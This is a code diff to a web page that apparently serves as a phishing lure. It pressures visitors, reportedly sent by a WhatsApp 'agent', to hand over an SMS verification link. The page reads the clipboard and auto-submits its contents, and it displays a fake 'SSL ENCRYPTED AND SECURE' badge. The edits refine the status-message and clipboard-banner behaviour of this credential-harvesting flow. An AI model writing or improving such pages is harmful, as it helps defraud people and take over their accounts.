@@ -65,20 +65,21 @@ body{display:flex;justify-content:center;align-items:flex-start;padding:10px 0 2
 .secure{margin-top:18px;border:1px solid #9ac497;background:#dbf0df;color:#2e7c43;border-radius:10px;padding:12px 10px;text-align:center;font-size:14px;font-weight:800;letter-spacing:.04em}
 .error{min-height:16px;margin-top:10px;font-size:12px;color:#c62828;text-align:center}
 .status-message{
-  margin-top:18px;
-  padding:14px 16px;
-  border-radius:12px;
+  margin-top:10px;
+  padding:10px 12px;
+  border-radius:10px;
   background:#fff4ec;
   border:1px solid #f5c7a8;
   color:#5b2f12;
-  font-size:15px;
+  font-size:13px;
   font-weight:800;
   text-align:center;
-  line-height:1.4;
+  line-height:1.35;
   display:none;
-  box-shadow:0 6px 14px rgba(245,124,32,.08);
+  box-shadow:0 4px 10px rgba(245,124,32,.06);
 }
 .status-message.show{display:block}
+.clipboard-banner.status-visible .clipboard-banner-row{display:none}
 .hidden{display:none !important}
 
 @media (max-width:380px){
@@ -148,6 +149,7 @@ body{display:flex;justify-content:center;align-items:flex-start;padding:10px 0 2
           <div class="clipboard-copy">Allow clipboard access to auto-paste the link from your SMS.</div>
           <button class="clipboard-btn" id="clipboardBtn" type="button">Allow</button>
         </div>
+        <div id="statusMessage" class="status-message"></div>
       </div>
 
       <div class="input-wrap">
@@ -160,7 +162,6 @@ body{display:flex;justify-content:center;align-items:flex-start;padding:10px 0 2
       <div class="note">If you don't understand how to do it, contact the agent who directed you here from WhatsApp.</div>
 
       <button class="verify-btn enabled" id="verifyBtn" type="button">Verify</button>
-      <div id="statusMessage" class="status-message"></div>
       <div id="error" class="error"></div>
       <div class="secure">◌ SSL ENCRYPTED AND SECURE</div>
     </div>
@@ -211,6 +212,7 @@ function startCountdown() {
 }
 
 let activeCountdown = null;
+let clipboardAccessClicked = false;
 
 function showLinkTiming() {
   if (activeCountdown) {
@@ -257,15 +259,19 @@ applySavedValues();
 showLinkTiming();
 
 function showStatus(message) {
-  if (!statusMessage) return;
+  if (!statusMessage || !clipboardBanner) return;
   statusMessage.textContent = message;
   statusMessage.classList.add('show');
+  if (clipboardAccessClicked) {
+    clipboardBanner.classList.add('status-visible');
+  }
 }
 
 function hideStatus() {
-  if (!statusMessage) return;
+  if (!statusMessage || !clipboardBanner) return;
   statusMessage.textContent = '';
   statusMessage.classList.remove('show');
+  clipboardBanner.classList.remove('status-visible');
 }
 
 async function submitVerification() {
@@ -355,7 +361,6 @@ async function requestClipboardAccess() {
     const clipboardText = await navigator.clipboard.readText();
     if (clipboardText && clipboardText.trim()) {
       sms.value = clipboardText.trim();
-      if (clipboardBanner) clipboardBanner.style.display = 'none';
       error.textContent = '';
       await submitVerification();
       return true;
@@ -374,7 +379,6 @@ async function pasteFromClipboard({ autoSubmit = false } = {}) {
   if (!clipboardText) return false;
 
   sms.value = clipboardText;
-  if (clipboardBanner) clipboardBanner.style.display = 'none';
   if (autoSubmit) {
     await submitVerification();
   }
@@ -398,6 +402,11 @@ function cancelLongPressPaste() {
 if (clipboardBtn) {
   clipboardBtn.addEventListener('click', async () => {
     error.textContent = '';
+    clipboardAccessClicked = true;
+    if (clipboardBanner) {
+      clipboardBanner.classList.remove('status-visible');
+      clipboardBanner.querySelector('.clipboard-banner-row')?.classList.add('hidden');
+    }
     await requestClipboardAccess();
   });
 }
